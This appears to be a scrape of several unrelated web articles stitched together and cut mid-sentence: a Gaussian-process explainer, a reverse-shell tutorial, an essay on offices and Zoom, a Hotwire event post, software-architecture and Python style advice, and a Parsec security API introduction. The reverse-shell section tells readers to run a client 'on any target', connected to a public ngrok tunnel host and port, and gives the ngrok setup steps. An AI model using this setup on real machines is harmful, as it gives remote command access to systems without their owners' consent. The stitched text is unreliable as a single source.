We can use this equivalent formulation to define MOGP via a <em>vector-valued</em> mean function, \(m\colon \mathcal{T} \to \mathbb{R}^p\), and a <em>matrix-valued</em> kernel, \(k\colon\mathcal{T}^2 \to \mathbb{R}^{p \times p}\). This mean function and kernel are <em>not</em> defined on the extended input space; rather, in this equivalent formulation, they produce <em>multi-valued outputs</em>.
The vector-valued mean function corresponds to the mean of the vector-valued GP, \(m(t) = \mathbb{E}[f(t)]\), and the matrix-valued kernel to the covariance matrix of vector-valued GP, \(k(t, t’) = \mathbb{E}[(f(t) - m(t))(f(t’) - m(t’))^\top]\).
When the matrix-valued kernel is evaluated at \(t = t’\), the resulting matrix \(k(t, t) =  \mathbb{E}[(f(t) - m(t))(f(t) - m(t))^\top]\) is sometimes called the <em>instantaneous spatial covariance</em>: it describes a covariance between different outputs at a given point in time \(t\).</p>

<p>Because MOGPs can be viewed as single-output GPs on an extended input space, inference works exactly the same way.
However, by extending the input space we exacerbate the scaling issues inherent with GPs, because the total number of observations is counted by adding the numbers of observations for each output, and GPs scale badly in the number of observations.
While inference in the single-output setting requires the inversion of an \(n \times n\) matrix (where \(n\) is the number of data points), in the case of \(p\) outputs, assuming that at all times all outputs are observed,<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup> this turns into the inversion of an \(np \times np\) matrix (assuming the same number of input points for each output as in the single output case), which can quickly become computationally intractable (i.e. not feasible to compute with limited computing power and time).
That is because the inversion of a \(q \times q\) matrix takes \(\mathcal{O}(q^3)\) time and \(\mathcal{O}(q^2)\) memory, meaning that time and memory performance will scale, respectively, cubically and quadratically on the number of points in time, \(n\), and outputs, \(p\).
In practice this scaling characteristic limits the application of this general MOGP formulation to data sets with very few outputs and data points.</p>

<h3 id="low-rank-approximations">Low-rank approximations</h3>

<p>A popular and powerful approach to making MOGPs computationally tractable is to impose a <a href="https://en.wikipedia.org/wiki/Rank_(linear_algebra)">low-rank</a> structure over the covariance between outputs.
That is equivalent to assuming that the data can be described by a set of latent (unobserved) Gaussian processes in which the number of these <em>latent processes</em> is fewer than the number of outputs.
This builds a simpler lower-dimensional representation of the data. The structure imposed over the covariance matrices through this lower-dimensional representation of the data can be exploited to perform the inversion operation more efficiently (we are going to discuss in detail one of these cases in the next post of this series).
There are a variety of different ways in which this kind of structure can be imposed, leading to an interesting class of models which we discuss in the next section.</p>

<p>This kind of assumption is typically used to make the method computationally cheaper.
However, these assumptions do bring extra <a href="https://en.wikipedia.org/wiki/Inductive_bias">inductive bias</a> to the model. Introducing inductive bias <a href="https://towardsdatascience.com/supercharge-your-model-performance-with-inductive-bias-48559dba5133">can be a powerful tool</a> in making the model more data-efficient and better-performing in practice, provided that such assumptions are adequate to the particular problem at hand.
For instance, <a href="https://epubs.siam.org/doi/pdf/10.1137/18M1183480">low-rank data</a> <a href="https://ieeexplore.ieee.org/document/1177153">occurs naturally</a> in <a href="https://www.sciencedirect.com/science/article/abs/pii/S0005109807003950">different settings</a>.
This also happens to be true in electricity grids, due to the <a href="https://lib.dr.iastate.edu/cgi/viewcontent.cgi?article=1031&amp;context=econ_las_conf">mathematical structure</a> of the …</p></div></div></div>

<h2>Some basics</h2>
<p>What is a reverse shell? With a reverse shell, the target makes the connection.
On your client is run a server program, which listening for incoming
connections. And the target execute a program, which connect to your client.
Then you can run commands on the target from your client. My research:</p>

<div id="how-to-run">
<h2>How to run</h2>
<p>We only uses the Python Standard Library, so we don't have to install anything.
Simple execute</p>

<p>and</p>

<p><img alt="alternate text" src="https://axju.de/images/articels/security/reverse-shell-001.gif"></p><p>The server run with <em>HOST=0.0.0.0</em> so that it listen on all incoming connection.
On some examples you read something like <em>HOST=localhost</em> or <em>HOST=127.0.0.1</em>.
But then it's only listen on connection from the <em>localhost</em>. You shouldn't
change the <em>HOST</em> of the server script. But if you run the client on another PC,
you have to enter the IP address of the server for the <em>HOST</em>. You get a problem
if the PC is not in your local network. Of course you can forward the port in
your router and then specify your public IP as <em>HOST</em>. But I want to show you
another way.</p>
</div>
<div id="ngrok">
<h2>ngrok</h2>
<p>ngrok is a reverse proxy that creates a secure tunnel from a public endpoint to
a locally running web service. Simply put, with ngrok you can make any local
service public. And we will make our server public. Go to
<a href="https://ngrok.com/">ngrok</a> sign up and follow the setup tutorial for your
system. For me it's</p>
<blockquote>
<ol>
<li><p>download</p>
<div><pre><span></span>wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
</pre></div>
</li>
<li><p>unzip</p>
<div><pre><span></span>unzip ngrok-stable-linux-amd64.zip
</pre></div>
</li>
<li><p>connect your account</p>
<div><pre><span></span>./ngrok authtoken 1WeW...
</pre></div>
</li>
<li><p>exposed the server</p>

</li>
</ol>
</blockquote>
<p>Now you are ready to run the client on any target, but you have to change the
<em>HOST</em> and <em>PORT</em> to the values from ngrok. For my example that will be</p>
<div><pre><span></span><span>...</span>
<span>HOST</span> <span>=</span> <span>'4.tcp.ngrok.io'</span>
<span>PORT</span> <span>=</span> <span>12050</span>
<span>....</span>
</pre></div>
<p><img alt="alternate text" src="https://axju.de/images/articels/security/reverse-shell-002.png">
</p></div>
<div id="conclusion">
<h2>Conclusion</h2>
<p>As you can see, it's not that complicated to create your own reverse shell and
make it public. I know, there's a lot of space to improve this script. But for a
really Simple example they are quite good enough.</p>

      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p><em>Disclaimer – This post was poorly researched and most of the historical ‘facts’ are pieced together from my own recollection, books I’ve been reading and Wikipedia searches. Despite the lack of rigorous scholarship (or perhaps because of it) I expect the conclusion to be 100% correct.</em></p>

<p>When the pandemic is “over” – or, more precisely, when the right people decide to declare it “over” and we are living in a world split between Covid-negative and Covid-positive countries with a several year life expectancy gap between them – the consensus is that some things will go back to the way they were pre-2020, and others won’t. Whether or not you think white collar workers will still be working from home – living in commuter belts, in or around small towns or in remoter parts of the country side with decent broadband – or will have migrated back into the offices, city pubs and crammed trains, depends largely on whether or not you have a financial interest in the value of commercial real estate. One thing everyone seems to agree on, though, is that video conferencing technology, such as Zoom, has been, and will continue to be, central to this revolution in working patterns.</p>

<p>Whatever the future of white collar work holds, I feel I can confidently predict that video conferencing will be not-so-fondly remembered as a weird crutch that everyone was obsessed with for about 12-18 months, before people realised it actually serves no purpose at all.</p>

<p>To argue this point, I will ask the question – why do we actually have offices in the first place? Who are they for? What problems do they solve? And which of those problems does video conferencing actually come close to addressing?</p>

<p>The history of bureaucratic white-collar work goes something like this: there are two main threads of office work which emerged around the Industrial Revolution – state-administration, and the bourgeoise professions (accountants, lawyers, traders, etc). Of the two threads, state administration is the older: bureaucracies of this sort can be traced back to ancient Egypt. Hierarchies beyond a certain size need paperwork, because the people in charge need a way to have their wishes transmitted authentically without corruption (accidental of nefarious) to hundreds or thousands of  lowly peons. Hence the priestly, and later bureaucratic, class, tasked with the top-down administration of unwieldy empires and later nation-states according to the insights or whims of their rulers.</p>

<p>Obviously, this type of administration pre-dates the “office” as we currently recognise it. There aren’t many western institutions which have been in continuous operation from medieval through to post-industrial times which we can analyse in this way, but one of them might be the British Parliament. Originally an ad-hoc assembly of the King’s noblemen, gathered as and when the King needed to raise some cash through taxation, this travelling parliament eventually evolved into the more stationary one we know today, where MPs have permanent offices and travel between their constituencies and the debating chambers according to how often they feel the need to escape from those people who elected them there in the first place. In 2021, those MPs are now spending a lot more time in their constituencies. Voting can now happen remotely, although MPs still have the option of attending debates in person. It’s hard to imagine British government functioning in quite the same way without the cut-and-thrust of rigorous parliamentary debate, but then again, it’s hard to see how any type of video conferencing solution could recreate it either (just look at what happened in this <a href="https://www.youtube.com/watch?v=jB3P_0GAi0I">disastrous parish council meeting</a>)</p>

<p>What of the rest of the state apparatus? The ambassadors, bureaucrats, etc? Well, to once again take an example from British history, a small cadre of Oxbridge-educated civil servants based in Whitehall, London, used to administer the largest empire in history with no more advanced technology than the telegraph. I can’t quite imagine a Zoom meeting between Prime Minister Disraeli and the governor-general of India, not to mention with the 120-or-so Indian noblemen scattered about the subcontinent, making this unwieldy task any easier.</p>

<p>So much for administering an empire. What about lower-level state administration – things like welfare, sanitation, treasury, etc? You might not be surprised to learn that the primary reason for co-locating lots of bureaucrats is because…<em>that’s where the filing cabinets were!</em> If you needed to process a tax return, or look up some obscure by-law, you generally had to be co-located with reams and reams of paper containing this information. The fact that this constituted an “office” is purely down to the fact that other people needed to be co-located with these files as well as you. The office was originally built for collaboration insofar as a library is built for meeting girls.</p>

<p>We’ve still not explored the other thread of this – the thread that runs from Venetian merchants to Google’s bean-bags and free lunches. This one is harder to explain. As the artisan evolved into the factory worker, so too did the other professionals – lawyers, accountants, merchants – evolve into the office worker. What was the rationale for this? Why should a lawyer or accountant, each of whom has a few assigned clients, need to work in an office with lots of other lawyers and accountants? Rather than being co-located with their filing cabinets, I suppose the reason is to allow them to share a pool of ancillary staff, like paralegals, typists, etc. However, as the digital revolution has swept through (and, since WWII, rising wages), much of the ancillary staff have been done away with altogether, or else morphed into something called ‘middle management’. The function of middle management, of course, is the same as the ancillary staff: to help the professionals do their jobs better, although by tweaking their job description they were able to negotiate better pay.</p>

<p>If you need ancillary staff (read: middle management), then it stands to reason that you need an office, too. And if you don’t have an office, then you probably need something that will ‘simulate’ an office. Here’s the problem: whereas the ancillary staff of old knew that their job was to type things up, keep appointment diaries and fetch post, middle management believes their job is to hold meetings. Therefore, synonymous with ‘home working’ is ‘Zoom meetings’.</p>

<p>I’ve actually omitted a third thread of office history, which is the monastery (or university in 21st century parlance). Why the need to have a bunch of monks living together? In fact, the original Christian monk was a hermit, living in total solitude. But perhaps in not having a family such a degree of loneliness was too much to bear. Hence the monastery, where, as well as (or perhaps in the course of) worshipping God, monks partook in such pastimes as beer brewing, geometry, and science. The fact that big groups of celibate, literate men living in the same place led to all sorts of interesting by-products is perhaps the root of the modern idea of a university, and that legacy also dovetails into our modern corporate culture which has its roots in the 1980s, whose hallmarks are the borrowing of university lingo such as ‘campus’, and a growing obsession with a nicely marketable form of self-improvement which can be delivered through highly lucrative training contracts.</p>

<p>There is a fleeting sense in which a modern university, with students living in halls, unemployed and frugal, could look a bit like, if you squint, a short stint at a medieval monastery, and whatever value universities still hold is probably related to how long you can hold onto that mirage. But the modern office, with its 9-to-5 clock and day punctuated by meetings and the ambitious preoccupied by the arduous climb up the corporate hierarchy, is even further away. Perhaps the closest thing to the medieval monastery is the startup, with its ungodly hours and religious-fanatical devotion to the cause, and it’s probably no coincidence that working in a startup is generally seen as incompatible with having a social or family life. But no, other than the monastic startup-office-cum-bedsit, the office serves no creative purpose. The modern office is little more than a cargo-cult monastery.</p>

<p>Having read and of course also agreed with all of this, one can only wonder what function software such as Zoom can possibly serve. And I think the answer to this is similar to something we often see from new digital technology: the skeuomorphism of existing ‘analogue’ concepts (ie, the modern ‘desktop’ containing ‘files’ and ‘documents’). Skeuomorphisms are almost always a temporary crutch, a cognitive bridge between the old inefficient way of doing something and the new but conceptually abstract way which will eventually replace it. Consider, for instance, the transition from written letters, to email, to instant messaging. Or how indeed the very idea of an email has become distinct in itself – look at how email etiquette has gradually evolved from when you might write one as you would write a letter in the early 2000s to the modern “see attached. cheers, Tom”. Or look at social media, how Facebook was built on top of your real-world idea of ‘friends’ by inventing the highly skeuomorphic (and somewhat autistic) concept of ‘friend requests’, before Instagram and Twitter developed the more digitally-native concept of ‘following’.</p>

<p>Zoom is the ‘friend request’ of the office world. As our work places reverse the 150-year migration from our homes into purpose built offices, recall that that reversal is due to the sudden erosion of the logic which made us move into offices in the first place: record keeping and reference, ancillary staff, and creative collaboration. Zoom and video conferencing is a sticking plaster, and perhaps a desperate plea by the old guard to remind us of how much better …</p></div></article></div></div></div>

<p><span>So one night, I call Clément, our CTO, and tell him : « Let’s ask DHH to come talk at our first ever WizVille-hosted tech event!». The idea would be to make a powerful statement to the Rails community in France: « WizVille means business, and takes inspiration from the best, you should join us! ».</span></p>
<p><span>Clément laughed and answered, « well, that’s a crazy idea, but he just launched Hotwire and a new version of Turbo today ». I open Hacker News, « <a href="https://hotwire.dev/" target="_blank" rel="noopener">Hotwire: HMTL over the wire</a> » is the #1 post. I find out about the tech and realize that not only Hotwire is a potential game changer, but also that this is the perfect opportunity.&nbsp;</span></p>
<p><span>It just took one email, I offered to gather as much of the French Rails community as possible for an event during which he could spread the word about Hotwire, and he accepted within 24 hours. I think he did because the email transpired the fact that I was maybe the most determined guy out there to be willing to gather as much of the Rails community for a dedicated event about HW.&nbsp;</span></p>
<h2><b>Not just another front-end framework</b></h2>
<p><span>At first, I thought Hotwire wasn’t meant to take over the front-end development game in David’s mind. But <strong>I was shocked by his answers and the displayed pureness of his ambition</strong> on why he created it and shipped HW for the world to use.&nbsp;</span></p>
<p><span>We all know David for his game changing vision with Rails, and his radical approach to working described in Rework and how it influenced the way the tech world sees work. But Rails was launched at a different time, when you’d think the competing technologies were “rather clearly” retrograde.&nbsp;</span></p>
<p><span>We also know how powerful frameworks like Vue and React are today. </span> <span>So, assuming the potential limitations of Hotwire, since it’s HTML-based, and the incredible contenders there are in the front-end development world (lead by the likes of Facebook, Google…), I never thought David was going to pitch us an upcoming shift in the way apps are created… even though it kinda feels obvious now that he’s described it to me.&nbsp;</span></p>
<h2><b>Why Hotwire could be the future&nbsp;</b></h2>
<ol>
<li aria-level="1"><span>You can learn Hotwire over a week-end according to David. On average it takes about a month or two with React. With V ue, about 2 to 4 weeks.&nbsp;</span></li>
<li aria-level="1"><b>Having to code everything in Javascript on the front-end has never been a free choice</b><span>: it’s always been a choice made out of the absence of alternatives. With HW, app builders won’t have to deal with the complexities of having developers specialized in a completely different technology. And will use the needed technology for the appropriate goal. That will dramatically increase the developer’s satisfaction since he will be able to use his preferred language and also manage most of the spectrum of web app building himself.&nbsp;</span></li>
<li aria-level="1"><span>Hotwire is an independent project from Rails, which means it works with any back end development framework.&nbsp;</span></li>
<li aria-level="1"><span>Hotwire also works on mobile. Out of Hey’s mobile app’s +100 screens, only one of them is built in native languages. There’s also a misconception about Strada (not released at the moment I’m writing this): it will just give developers a more conventionalized approach for interacting with their native apps, but that’s it.&nbsp;</span></li>
<li aria-level="1"><span>Hotwire works for every kind of app, save for apps that really require javascript’s abilities as a technology, and need to work independently in the client (calendars or apps like Figma). That kind of app is a very small fraction, and Hotwire can be combined with a JS framework like React or Vue if needed.&nbsp;</span></li>
</ol>
<p><b>So there you have all the ingredients to replace any front-end framework:</b></p>
<ul>
<li aria-level="1"><span>Speed: get your developers up to speed on your front-end framework faster, and therefore potentially ship your product faster</span></li>
<li aria-level="1"><span>Simplicity: easier for back-end developers to do otherwise complex front-end work</span></li>
<li aria-level="1"><span>Coherent technology choice : use complex front-end frameworks only when needed for some features</span></li>
<li aria-level="1"><span>Compatibility : works with all back-end frameworks and all types of web apps</span></li>
</ul>
<h2><b>Main concerns to date&nbsp;</b></h2>
<p><span>The main concerns are mostly related to <strong>how little time it’s been since Hotwire has been released</strong>. This means smaller community and stack overflow threads, and also fewer plugins. The most advanced design framework you could use is <a href="https://tailwindcss.com/" target="_blank" rel="noopener">Tailwind</a>, a CSS framework. Which may have us coding our own animations or having to combine with other libraries…? </span><span>Also, having to combine front-end frameworks in some cases, doesn’t feel ideal.</span></p>
<p><span>David told us that Hotwire was up to a much stronger start than Rails, so we could expect to have most of those concerns solved along the road.&nbsp;</span></p>
<p><b>But the mere fact that David Heinemier Hansson deeply believes that his personal mission is to liberate developers from the grip of Single-Page-Apps with Hotwire should definitely have everyone’s attention in Tech. And it definitely has ours at WizVille.&nbsp;</b></p>
<h2><b>About the event&nbsp;</b></h2>
<p><span>The event was called « Hotwire &amp; Startups: Dreaming bigger With Rails in 2021 » and you can enjoy David’s 1 hour fireside chat mainly about Hotwire below:&nbsp;</span></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>A team of developers have been given a new greenfield project to deliver. The powers that be told them they have full control over the technical direction of the project. The team was excited to move on from their legacy project, it was a great opportunity for them to apply the lessons from the old onto the new. They were going to <em>do things properly</em> this time.</p><h2 id="building-a-barn-with-a-golden-hammer">Building a Barn With a Golden Hammer</h2><p>One of the developers closely follows the <a href="https://eng.uber.com/" target="_blank" rel="nofollow noopener noreferrer">Uber Engineering Blog</a> and there she read Uber uses Golang to hit stellar RPS (requests per second) numbers. She proposed that the team writes this project in Golang so they can leverage that same performance.</p><p>The second developer suggested they use React for the frontend and build an SPA (single page application), because that's what everyone's doing these days and it's the de facto standard.</p><p>The last developer found great success with serverless microservices at his previous company. He recommended they leverage the near infinite scalability of the serverless platform for their new project.</p><p>At face value, the plan seemed solid - Golang on the backend, a React SPA on the frontend and it's all going to be served by a serverless microservice infrastructure. It was going to be performant, infinitely scalable and decoupled.</p><p>Executing the plan proved more difficult than they anticipated. It turns out they forgot to take a few things into account.</p><p>The team didn't have any real experience with Golang as they were all primarily PHP developers. Building a React SPA was proving to be a time sink as they now had an additional problem of communicating with APIs. By the time they had 12 microservices, the complexity of their system was causing more issues than it was solving. To add insult to injury, they were only asked to build a very basic inventory management system for internal use.</p><p>Somewhere in the excitement and the prospect of doing it like the big companies the team forgot where they were, what worked for them and what they were building. What they thought they had was a solid architectural foundation to build upon, but what they ended up with was an <em>unarchitecture</em>.</p><h2 id="what-exactly-is-unarchitecture">What Exactly is Unarchitecture?</h2><p>I actually borrowed the idea for the word from <a href="https://unarchitecture.wordpress.com/about/" target="_blank" rel="nofollow noopener noreferrer">this blog</a> and think it encompasses what I'm trying to convey here. To me, unarchitecture is ill-fitting software architecture, which is often born of best intentions.</p><p>If good software architecture makes a codebase easy and enjoyable to work with, then unarchitecture is the antithesis of that. An unarchitected codebase is a source of endless friction and misery for developers, it makes new features tiresome to develop and fixing bugs a soul-crushing exercise.</p><h2 id="where-and-how-does-it-happen">Where and How Does it Happen?</h2><p>The story in the introduction has a series of questionable decisions that led to unarchitecting the codebase, but in reality all it takes is just one decision to create a pocket of friction in any codebase. For example, you could just over-engineer the CI pipeline and make nobody on your team want to touch it with a 10 foot pole.</p><p>I've found that unarchitecture often comes from a good place. We often tend to apply what we already know as working without really weighing up the pros and cons (everything has cons) of the approaches within our current context. What worked for a company with a team of 20 might not necessarily work for a team of 3. This applies across the board to software packages, languages, libraries, frameworks and patterns.</p><p>I like to think it's akin to wearing your parents shoes when you're 7. You've seen your parents walk in them and you really want to be like the grown ups, but once you try them on you can barely walk in them, much less run.</p><h2 id="preventing-unarchitecture">Preventing Unarchitecture</h2><p>I think there are a few ways we can try and prevent ourselves from unarchitecting our applications:</p><ul><li>We should aim to try and keep things as simple as possible for as long as possible. Introduce complexity only when we really need it.</li><li>Put our ego aside and question whether the pattern or technology we're applying is right for us, within our current context. Some questions that I like to ask myself are:<ul><li>Will my team realistically be able to maintain this? Do we have the skills required currently, can we learn or grow the team to accommodate for what we're trying to achieve?</li><li>Can it stifle future growth? If we're going for simplicity, will it be hard to evolve if we need to?</li><li>If our decision turns out being a mistake, how hard will it be to take a step back and go on a different path?</li><li>Is this something that will bring us value? How? Maybe our efforts are better focused elsewhere?</li></ul></li><li>I'm a big believer in <a href="https://www.thoughtworks.com/insights/blog/applying-conways-law-improve-your-software-development" target="_blank" rel="nofollow noopener noreferrer">Conway's Law</a> and think we should take into account the structure of the organisation when we're architecting our applications. Our architecture should either complement the structure or drive change in the direction that we want to go.</li></ul><h2 id="closing-note">Closing Note</h2><p>In a world where microservices, serverless, Leviathan-esque container orchestration tools and decoupled frontends are all the rage, it's easy to lose sight of where we are and what we're trying to achieve and give in to hype driven development instead.</p><p>I think, in general, we should just strive to approach software architecture with more pragmatism and not give in to dogma. After all, there's no such thing as a panacea.</p></div></div>]]>

<blockquote><p>Cruft (<em>noun</em>) [INFORMAL | COMPUTING] : badly designed, unnecessarily complicated, or unwanted code or software.</p></blockquote>



<h2>First and foremost, keep things simple…</h2>



<p>As much as possible, keep everything smaller. Smaller projects are better. Smaller packages are better. Smaller interfaces are better. Smaller classes are better. Smaller functions / methods are better. Smaller tests are better.</p>



<p>Make sure any developer on the team (or a new joiner) can encompass the entirety of your “unit” in their mind. This reduces <a href="https://en.wikipedia.org/wiki/Accidental_complexity" target="_blank" rel="noreferrer noopener">accidental complexity</a> and makes everything else easier.</p>



<p>When working with existing code which is intimidating, try to think of ways to break it down into smaller pieces and to simplify. Think of ways to reduce it. Deleting code (when done with care) can be as valuable as writing new code.</p>



<p>In particular, strive to keep functions concise. Bigger functions create bigger problems and are more difficult to test.</p>



<h2>begin by simplifying the logic</h2>



<p>“<em>Branching</em>” is the term used to describe a point in the code where the business logic can go in one of several different ways. Branching adds complexity, as each possible path needs to be understood and tested in isolation. The way to reduce branching is to use fewer conditional statements (like <code>if</code>). Code that uses a lot of <code>if</code> statements (or other <em>conditional logic</em>) has many branches, which makes it difficult to follow, to debug and to test.</p>



<p>“<em>Side-effects</em>” is a term we use to describe any way in which the code affects its environment or the flow of execution, other than a function returning a value. Side effects, like branching, also increase the logical complexity of the code, making it less readable, difficult to follow and difficult to test.</p>



<p>As much as possible, minimise and isolate side effects. This includes not only I/O, network calls and OS interrupts, but also raising exceptions and modifying the internal state of data structures defined outside the function.</p>



<p>Of course, both branching and side-effects are unavoidable – they are essential building blocks of any useful software system. The important thing is to remain conscious about the added complexity and do our best to stay on top of it.</p>



<p>Try to keep side effects <a href="https://danuker.go.ro/the-grand-unified-theory-of-software-architecture.html" target="_blank" rel="noreferrer noopener">higher up</a> in the call stack. This helps make code more reusable and simplifies testing by reducing the need to use mocks.</p>



<h2>Keep your code clean</h2>



<p>Keep function signatures clean, readable and consistent. This helps form team habits and expectations which increase productivity.</p>



<p>Make good use of type annotations / type hints in Python. They make the codebase more readable. The type checker is an essential tool in the build process that can catch both trivial errors and unexpected business logic behaviours. (Make sure to correctly use <code>Optional[int]</code> vs <code>int</code>, etc. ) There is no need to go overboard with annotations. Try to keep your annotations clean and simple. Messy annotations are often symptoms of design that can be improved (e.g. try to choose better data structures or refactor into even simpler functions).</p>



<p><a rel="noreferrer noopener" href="https://stackoverflow.com/questions/49002/prefer-composition-over-inheritance" target="_blank">Limit</a> the use of class inheritance. Keep inheritance hierarchies shallow. Overuse of inheritance makes code difficult to follow and often results in complex objects with unnecessary properties and methods. See also: “<a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Liskov_substitution_principle" target="_blank">Liskov substitution principle</a>”. </p>



<h2>Keep your tests clean</h2>



<p>Keep tests clean, readable and concise. Avoid patching and mocking as much as possible. Messy tests are a symptom of messy code.</p>



<p>Remember, unit tests are meant to exercise units. Units should be small. Unit tests should be small.</p>



<p>A classical unit test provides some controlled input to a function (or method) and makes assertions about the return value.</p>



<p>Avoid writing tests which only assert on log entries or other side effects. If it’s impossible to test the function in any other way, it may be better to re-design the function to be testable in a more classical way.</p>



<p>Avoid writing tests that are overly concerned with HOW a method does what it does. E.g. tests which only make assertions about what other functions a method calls are missing the point of unit testing. Again, if there is no obviously better way to test that method, it may be better to spend time refactoring it instead of coming up with over-complicated but meaningless assertions.</p>



<p>When testing exceptions in Python, make use of <code>assertRaises()</code> instead of wrapping the function in a try / except block and failing the test explicitly in the else clause.</p>



<p>Whenever a more elaborate setup is required, which involves a lot of test data (e.g. configuration JSON, etc.) – put the test data in an external fixture, instead of polluting the main test code with large blobs of data, making it difficult to read and maintain. </p>



<h2>Keep improving your mastery of the language</h2>



<p>Make the best possible use of the Python language (or whichever language you are using). Avoid reinventing the wheel or using libraries where a simpler language construct can do. In Python, make sure to master the use of list and dictionary comprehensions; the ternary operator (<code>"a if condition else b"</code>); the use of “<code>or"</code> for fall-back values / defaults, generators, etc.</p>



<p>Continuously improve your knowledge of the (rather vast) Python standard library and the functions and constructs available, which do not require any external dependencies.</p>



<p>Learn a bit about functional programming and try to apply the main principles to your Python code as much as possible. Use the higher-order features of the language and the standard library for cleaner, more concise and more powerful functional programming solutions to common problems.</p>



<h2>Reduce reliance on external dependencies</h2>



<p>Scrutinise all dependence on external libraries and frameworks to keep them to the necessary minimum. Dependency cruft is a real thing – and it can weigh a lot.</p>



<p>As much as possible, ensure use of the latest releases of all libraries and tools (including Python itself.) The problems you’ll run into with “bleeding edge” tools are less common than the problems you’ll have with out-of-date tools.</p>



<p>In your Python virtual environment, make use of <a rel="noreferrer noopener" href="https://github.com/jazzband/pip-tools/" target="_blank">pip-tools</a> to stay on top of your <code>requirements.txt</code> files and dependency versions. </p>



<h2>Do your best to name things better</h2>



<p>Names are important (except when they’re not – see next paragraph). It’s notoriously hard, but try your best to come up with short, concise, yet meaningful names to files, modules, classes, functions, variables, etc. It is generally safe to assume that whoever is reading your code has enough domain knowledge as to be familiar with the terminology in the context, but whenever possible, avoid too much jargon and stick to simpler terms / names. </p>



<p>The scope of named things is also important. For very short-lived, temporary variables (for example, those used in one-liners) it’s OK to use much shorter symbolic names (e.g., <code>a</code>, <code>b</code>, <code>i</code>, <code>n</code>) for the sake of brevity. For longer-lived, more important names, if the value of (or use of) the variable changes in a fundamentally different way to what it was when you first named it – make sure to change the name as well. You don’t have to be extra frugal when dispensing new variables in those circumstances. It’s far more important that <code>original_values</code> changes to <code>processed_values</code> once it’s been modified, than to save a couple bytes of memory by stubbornly sticking to the old variable. </p>



<p>Avoid shadowing, redefining or overloading variables (or other names). This<br>makes logic difficult to follow by humans and often leads to mistakes. It also<br>makes code difficult to follow by static analysis tools – e.g. type checkers<br>(MyPy / PyTypes spin extra hard to try and infer all possible types each time a<br>variable is redefined, which can lead to false positives as well as inefficient<br>type inference). Be particularly careful to avoid shadowing built-in keywords or<br>library names (e.g. <code>type</code>, <code>id</code>, <code>next</code>, <code>list</code>, etc.)</p>

<p><strong>Parsec</strong> is the <strong>P</strong>latform <strong>A</strong>bst<strong>R</strong>action for <strong>SEC</strong>urity, a new open-source initiative to
provide a common <a href="https://parallaxsecond.github.io/parsec-book/parsec_client/api_overview.html">API</a> to secure services in a platform-agnostic way.</p>
<p>Parsec aims to define a universal software standard for interacting with secure object storage and
cryptography services, creating a common way to interface with functions that would traditionally
have been accessed by more specialised APIs. Parsec establishes an ecosystem of developer-friendly
libraries in a variety of popular programming languages. Each library is designed to be highly
ergonomic and simple to consume. This growing ecosystem will put secure facilities at the fingertips
of developers across a broad range of use cases in infrastructure computing, edge computing and the
secure Internet of Things.</p>

<p>Today's computing platforms have evolved to offer a range of facilities for secure storage and
secure operations. There are hardware-backed facilities such as the Hardware Security Module (HSM)
or Trusted Platform Module (TPM). There are firmware services running in Trusted Execution
Environments (TEE). There are also cloud-based security services. At a bare minimum, security
facilities may be provided purely in software, where they are protected by mechanisms provided in
the operating system.</p>
<p>Over the years, software standards have emerged to allow developers to use these facilities from
their applications. But these standards bring with them the following challenges:</p>
<ul>
<li>They are defined with the expectation that the caller is the "owner" of the platform, meaning that
it has sole access to the underlying hardware. In reality, this is often not the case, because
the caller might reside in a container or virtual machine, where it is sharing the host hardware
with other applications. Existing software standards do not cater well for this situation.</li>
<li>They are defined exhaustively, with lengthy specifications detailing all permissible operations
and parameters. They are written from the perspective of the security device and its
capabilities, rather than from the perspective of the application and its use case. This can
offer a daunting and bewildering experience for developers, who spend a lot of time and effort
figuring out how to map their use case onto the API. There is nothing to tailor the API so that
it can be consumed easily for common, simple cases.</li>
<li>They are specific to a programming language such as C. To consume them in other languages, it is
necessary to use interoperability layers such as Foreign Function Interface (FFI), which can make
the developer experience even more cumbersome and unnatural. Interoperability layers can also be
a source of vulnerabilities.</li>
<li>Standards tend to be adopted based on some knowledge of the target platform. So while it might be
possible for code to be portable across multiple HSM vendors, for example, it is much harder to
make code portable between an HSM-based platform and a TPM-based platform.</li>
</ul>
<p>Parsec inverts this traditional approach to standardizing security interfaces, and it does so by
putting applications front and center. It offers an API that is no less comprehensive, but it does
so in a way that puts the needs of applications and their common use cases first.</p>
<p>Applications simply want the best-available security, and they want to be able to consume it in a
way that is simple, natural, and hard to get wrong.</p>
<p>The following observations can be made about such applications:</p>
<ul>
<li>They can be written in a variety of programming languages.</li>
<li>They may be written with no explicit knowledge of the hardware capabilities of the target
platform, such as whether an HSM or TPM is available.</li>
<li>They are often sharing the target platform hardware with other applications due to the use of
virtualization or containerization technology.</li>
<li>The secure assets owned by one application must be isolated from those owned by another. For
example, private keys provisioned on a hardware device must be isolated such that only the
provisioning application would be able to perform subsequent operations with those keys.</li>
<li>They have differing requirements in terms of permissible cryptographic algorithms and key
strengths.</li>
</ul>
<p>These observations motivate the need for a new platform abstraction that offers a common palette of
security primitives via a software interface that is both agnostic with respect to the underlying
hardware capabilities, and also capable of supporting multiple client applications on the same host,
whether those be within containers or within traditional virtual machines.</p>
<p>Parsec is a new software architecture and ecosystem that addresses this need.</p>

<p>Parsec is founded on the <a href="https://developer.arm.com/architectures/security-architectures/platform-security-architecture"><strong>Platform Security Architecture
(PSA)</strong></a>.
The PSA is a holistic set of threat models, security analyses, hardware and firmware architecture
specifications, and an open source firmware reference implementation. The PSA provides a recipe,
based on industry best practice, that allows security to be consistently designed in, at both a
hardware and firmware level.</p>
<p>One of the provisions of the PSA is the <a href="https://github.com/ARMmbed/mbed-crypto/blob/psa-crypto-api/docs/PSA_Cryptography_API_Specification.pdf"><strong>PSA Crypto
API</strong></a>.
The PSA Crypto API is a comprehensive library of modern security primitives covering the following
functional areas:</p>
<ul>
<li>Key provisioning and management</li>
<li>Hashing</li>
<li>Signing</li>
<li>Message Authentication Codes (MAC)</li>
<li>Asymmetric encryption</li>
<li>Symmetric encryption</li>
<li>Authenticated Encryption with Associated Data (AEAD)</li>
<li>Key derivation</li>
<li>Entropy (random number generation)</li>
</ul>
<p>A crucial characteristic of the PSA Crypto API is that applications always reference the keys
opaquely, making it ideally suited to implementations where keys are provisioned within hardware and
are never exposed.</p>
